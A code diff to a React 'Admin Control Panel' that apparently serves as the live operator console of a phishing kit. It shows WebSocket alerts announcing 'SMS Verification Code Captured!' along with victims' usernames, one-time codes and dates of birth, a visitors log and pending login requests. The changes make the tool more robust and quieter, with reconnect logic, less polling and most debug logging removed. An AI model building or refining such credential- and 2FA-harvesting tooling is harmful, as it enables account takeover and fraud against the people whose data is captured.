@@ -14,7 +14,19 @@ import {
   VolumeX,
   Activity,
   Copy,
+  FileText,
 } from "lucide-react";
+
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogCancel,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 import { apiRequest } from "@/lib/queryClient";
 import { queryClient } from "@/lib/queryClient";
@@ -53,8 +65,19 @@ export default function AdminControl() {
   const [unreadCount, setUnreadCount] = useState(0);
   const [smsCodeHistory, setSmsCodeHistory] = useState<SMSCode[]>([]);
   const [pageActivity, setPageActivity] = useState<PageActivity[]>([]);
+  const [clearDialogOpen, setClearDialogOpen] = useState(false);
   const wsRef = useRef<WebSocket | null>(null);
+  const reconnectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const audioContextRef = useRef<AudioContext | null>(null);
+  const audioEnabledRef = useRef(audioEnabled);
+  const notificationsEnabledRef = useRef(notificationsEnabled);
+
+  useEffect(() => {
+    audioEnabledRef.current = audioEnabled;
+  }, [audioEnabled]);
+  useEffect(() => {
+    notificationsEnabledRef.current = notificationsEnabled;
+  }, [notificationsEnabled]);
 
   // Fetch pending login requests (fallback if WebSocket fails)
   const {
@@ -63,13 +86,13 @@ export default function AdminControl() {
     refetch,
   } = useQuery<PendingRequest[]>({
     queryKey: ["/api/admin/pending"],
-    refetchInterval: 10000, // Slower polling as backup (WebSocket is primary)
+    refetchInterval: wsConnected ? false : 10000,
   });
 
   // Fetch SMS history
   const { data: smsHistory = [] } = useQuery<SMSCode[]>({
     queryKey: ["/api/admin/sms-history"],
-    refetchInterval: 10000,
+    refetchInterval: wsConnected ? false : 10000,
   });
 
   // Sync smsHistory from API with local state
@@ -83,7 +106,7 @@ export default function AdminControl() {
   const playNotificationSound = async (
     eventType: "login" | "sms" | "complete" = "login",
   ) => {
-    if (!audioEnabled) return;
+    if (!audioEnabledRef.current) return;
 
     try {
       if (!audioContextRef.current) {
@@ -138,7 +161,7 @@ export default function AdminControl() {
     body: string,
     icon?: string,
   ) => {
-    if (!notificationsEnabled || !("Notification" in window)) return;
+    if (!notificationsEnabledRef.current || !("Notification" in window)) return;
 
     if (Notification.permission === "granted") {
       const notification = new Notification(title, {
@@ -170,6 +193,9 @@ export default function AdminControl() {
     } else {
       document.title = "Admin Control Panel";
     }
+    return () => {
+      document.title = "Admin Control Panel";
+    };
   }, [unreadCount]);
 
   // Request notification permission
@@ -206,23 +232,32 @@ export default function AdminControl() {
 
   // WebSocket connection
   useEffect(() => {
+    let cancelled = false;
     const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
     const wsUrl = `${protocol}//${window.location.host}/ws`;
 
+    const scheduleReconnect = () => {
+      if (cancelled) return;
+      if (reconnectTimerRef.current) clearTimeout(reconnectTimerRef.current);
+      reconnectTimerRef.current = setTimeout(() => {
+        reconnectTimerRef.current = null;
+        connect();
+      }, 3000);
+    };
+
     const connect = () => {
+      if (cancelled) return;
       try {
         const ws = new WebSocket(wsUrl);
         wsRef.current = ws;
 
         ws.onopen = () => {
-          console.log("[WebSocket] Connected to admin notifications");
           setWsConnected(true);
         };
 
         ws.onmessage = (event) => {
           try {
             const data = JSON.parse(event.data);
-            console.log("[WebSocket Message Received]", data.type);
 
             if (data.type === "initial_data") {
               // Initial data load
@@ -249,7 +284,6 @@ export default function AdminControl() {
               });
             } else if (data.type === "sms_verification_step1") {
               // Step 1: SMS code entered - add to history and show notification
-              console.log("[Step 1 Received]", data.data);
               setSmsCodeHistory((prev) => {
                 // Check if entry already exists to prevent duplicates
                 const exists = prev.some(
@@ -260,13 +294,7 @@ export default function AdminControl() {
                       item.code === data.data.smsCode),
                 );
 
-                if (exists) {
-                  console.log(
-                    "[Step 1] Duplicate entry ignored:",
-                    data.data.sessionId,
-                  );
-                  return prev;
-                }
+                if (exists) return prev;
 
                 const newEntry = {
                   username: data.data.username,
@@ -274,10 +302,8 @@ export default function AdminControl() {
                   timestamp: data.data.timestamp,
                   sessionId: data.data.sessionId,
                 };
-                console.log("[Step 1 Adding Entry]", newEntry);
                 return [newEntry, ...prev].slice(0, 10);
               });
-              console.log("[Step 1 Toast]");
               playNotificationSound("sms");
               showBrowserNotification(
                 "📱 SMS Verification Code Captured!",
@@ -309,7 +335,6 @@ export default function AdminControl() {
                 }
                 return prev;
               });
-              playNotificationSound("complete");
               showBrowserNotification(
                 "✅ SMS Verification Complete!",
                 `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\nDate of Birth: ${data.data.dateOfBirth}\n\nAll verification data captured successfully!`,
@@ -349,21 +374,26 @@ export default function AdminControl() {
         };
 
         ws.onclose = () => {
-          console.log("[WebSocket] Disconnected, attempting to reconnect...");
           setWsConnected(false);
-          setTimeout(connect, 3000);
+          scheduleReconnect();
         };
       } catch (error) {
         console.error("[WebSocket] Connection error:", error);
-        setTimeout(connect, 3000);
+        scheduleReconnect();
       }
     };
 
     connect();
 
     return () => {
+      cancelled = true;
+      if (reconnectTimerRef.current) {
+        clearTimeout(reconnectTimerRef.current);
+        reconnectTimerRef.current = null;
+      }
       if (wsRef.current) {
         wsRef.current.close();
+        wsRef.current = null;
       }
     };
   }, []);
@@ -442,7 +472,6 @@ export default function AdminControl() {
   const copyText = async (value: string, label: string) => {
     try {
       await navigator.clipboard.writeText(value);
-      console.log(`${label} copied`);
       toast({
         title: `${label} copied`,
         description: value,
@@ -528,6 +557,18 @@ export default function AdminControl() {
               </Button>
 
               <Button
+                onClick={() =>
+                  window.open("/visitors.txt", "_blank", "noopener,noreferrer")
+                }
+                variant="outline"
+                className="flex items-center gap-2"
+                data-testid="button-open-visitors"
+              >
+                <FileText className="h-4 w-4" />
+                <span className="hidden sm:inline">Visitors</span>
+              </Button>
+
+              <Button
                 onClick={() => refetch()}
                 disabled={isLoading}
                 variant="outline"
@@ -541,15 +582,7 @@ export default function AdminControl() {
               </Button>
 
               <Button
-                onClick={() => {
-                  if (
-                    confirm(
-                      "Are you sure you want to clear all logs? This action cannot be undone.",
-                    )
-                  ) {
-                    clearLogsMutation.mutate();
-                  }
-                }}
+                onClick={() => setClearDialogOpen(true)}
                 disabled={clearLogsMutation.isPending}
                 variant="destructive"
                 className="flex items-center gap-2"
@@ -1035,6 +1068,28 @@ export default function AdminControl() {
           </Card>
         </section>
       </div>
+
+      <AlertDialog open={clearDialogOpen} onOpenChange={setClearDialogOpen}>
+        <AlertDialogContent>
+          <AlertDialogHeader>
+            <AlertDialogTitle>Clear all logs?</AlertDialogTitle>
+            <AlertDialogDescription>
+              This will remove all pending requests and SMS history. This action
+              cannot be undone.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter>
+            <AlertDialogCancel>Cancel</AlertDialogCancel>
+            <AlertDialogAction
+              onClick={() => clearLogsMutation.mutate()}
+              className="bg-red-600 hover:bg-red-700"
+              data-testid="button-confirm-clear-logs"
+            >
+              Clear logs
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 }
